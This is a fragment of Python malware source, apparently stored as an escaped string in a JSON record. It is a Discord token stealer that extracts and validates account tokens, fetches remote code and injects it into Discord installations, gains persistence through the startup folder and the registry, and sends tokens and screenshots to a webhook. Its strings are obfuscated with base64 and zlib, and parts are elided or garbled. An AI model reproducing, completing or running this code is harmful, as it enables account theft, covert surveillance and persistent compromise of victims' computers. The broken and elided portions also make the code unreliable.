return decrypted_pass\n\n# --- Discord token extraction and exfiltration ---\nclass extract_tokens:\n    def validate_token(self, token):\n        r = requests.get(self.base_url, headers={base64.b64decode(zlib.decompress(b'x...')).decode(): token})\n        if r.status_code == int.from_bytes(...):\n            return True\n        return False\n\nclass upload_tokens:\n    def __init__(self, webhook):\n        self.tokens = extract_tokens().tokens\n        self.webhook = SyncWebhook.from_url(webhook)\n    def upload(self):\n        if not self.tokens:\n            return\n        for token in self.tokens:\n            user = requests.get(base64.b64decode(zlib.decompress(b'x...')).decode(), headers={base64.b64decode(zlib.decompress(b'x...')).decode(): token}).json()\n            embed = Embed(title=base64.b64decode(zlib.decompress(b'x...')).decode().format(username, user_id), color=int.from_bytes(...))\n            self.webhook.send(embed=embed, username=base64.b64decode(zlib.decompress(b'x...')).decode(), avatar_url=base64.b64decode(zlib.decompress(b'x...')).decode())\n\n# --- Injection into Discord installations ---\nclass Injection:\n    def __init__(self, webhook):\n        self.appdata = os.getenv(base64.b64decode(zlib.decompress(b'x...')).decode())\n        self.discord_dirs = [self.appdata + base64.b64decode(zlib.decompress(b'x...')).decode(), ...]\n        self.code = requests.get(base64.b64decode(zlib.decompress(b'x...')).decode()).text\n        for proc in psutil.process_iter():\n            if base64.b64decode(zlib.decompress(b'x...')).decode() in proc.name().lower():\n                proc.kill()\n        for dir in self.discord_dirs:\n            if not os.path.exists(dir):\n                continue\n            if self.get_core(dir) is not None:\n                with open(self.get_core(dir)[...] + base64.b64decode(zlib.decompress(b'x...')).decode(), base64.b64decode(zlib.decompress(b'x...')).decode(), encoding=base64.b64decode(zlib.decompress(b'x...')).decode()) as f:\n                    f.write(self.code.replace(base64.b64decode(zlib.decompress(b'x...')).decode(), self.get_core(dir)[...]).replace(base64.b64decode(zlib.decompress(b'x...')).decode(), webhook))\n                    self.start_discord(dir)\n\n# --- Persistence via startup folder and registry modification ---\nclass Startup:\n    def __init__(self):\n        self.working_dir = os.getenv(base64.b64decode(zlib.decompress(b'x...')).decode()) + base64.b64decode(zlib.decompress(b'x...')).decode()\n        if self.check_self():\n            return\n        self.mkdir()\n        self.write_stub()\n        self.regedit()\n    def check_self(self):\n        if os.path.realpath(sys.executable) == self.working_dir + base64.b64decode(zlib.decompress(b'x...')).decode():\n            return True\n        return False\n    def mkdir(self):\n        if not os.path.isdir(self.working_dir):\n            os.mkdir(self.working_dir)\n        else:\n            shutil.rmtree(self.working_dir)\n            os.mkdir(self.working_dir)\n    def write_stub(self):\n        shutil.copy2(os.path.realpath(sys.executable), self.working_dir + base64.b64decode(zlib.decompress(b'x...')).decode())\n        with open(file=base64.b64decode(zlib.decompress(b'x...')).decode().format(self.working_dir), mode=base64.b64decode(zlib.decompress(b'x...')).decode()) as f:\n            f.write(base64.b64decode(zlib.decompress(b'x...')).decode().format(self.working_dir))\n    def regedit(self):\n        subprocess.run(args=[base64.b64decode(zlib.decompress(b'x...')).decode(), ...], shell=True)\n        subprocess.run(args=[base64.b64decode(zlib.decompress(b'x...')).decode(), ...], shell=True)\n\n# --- System information and screenshot exfiltration ---\nclass SystemInfo:\n    def __init__(self, webhook):\n        webhook = SyncWebhook.from_url(webhook)\n        embed = Embed(title=base64.b64decode(zlib.decompress(b'x...')).decode(), color=int_from_bytes(...))\n        image = ImageGrab.grab(bbox=None, include_layered_windows=False, all_screens=True, xdisplay=None)\n        image.save(base64.b64decode(zlib.decompress(b'x...')).decode())\n        embed.set_image(url=base64.b64decode(zlib.decompress(b'x...')).decode())\n        try:\n            webhook.send(embed=embed, file=File(base64.b64decode(zlib.decompress(b'x...')).decode(), filename=base64.b64decode(zlib.decompress(b'x...')).decode()), username=base64.b64decode(zlib.decompress(b'x...')).decode(), avatar_url=base64.b64decode(zlib.decompress(b'x...')).decode())\n        except:\n            pass\n        if os.path.exists(base64.b64decode(zlib.decompress(b'x...')).decode()):\n            os.remove(base64.b64decode(zlib.decompress(b'x...')).decode())"
    }
  }
]